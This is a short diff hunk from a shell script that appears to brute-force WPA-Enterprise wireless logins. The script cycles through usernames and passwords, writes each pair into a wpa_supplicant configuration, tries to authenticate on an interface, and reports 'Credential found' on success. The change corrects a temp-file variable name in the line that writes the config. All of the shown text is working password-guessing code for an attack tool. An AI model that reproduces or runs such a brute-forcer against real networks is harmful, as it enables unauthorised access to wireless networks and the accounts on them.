@@ -47,7 +47,7 @@ for user in $(cat $ufile); do
       cat $tmpfile | \
       sed -e "s/ssid=\".*\"/ssid=\"$ssid\"/" | \
       sed -e "s/identity=\".*\"/identity=\"$user\"/" | \
-      sed -e "s/password=\".*\"/password=\"$pwd\"/" > $tempfile
+      sed -e "s/password=\".*\"/password=\"$pwd\"/" > $tmpfile
       [ ! -z "$debug" ] && echo "Trying $user:$pwd" 
       if timeout $t ${wpa_sup} -c $tmpfile -i $iface 2>/dev/null | grep complete >/dev/null ; then 
          echo "Credential found: $user:$pwd" 
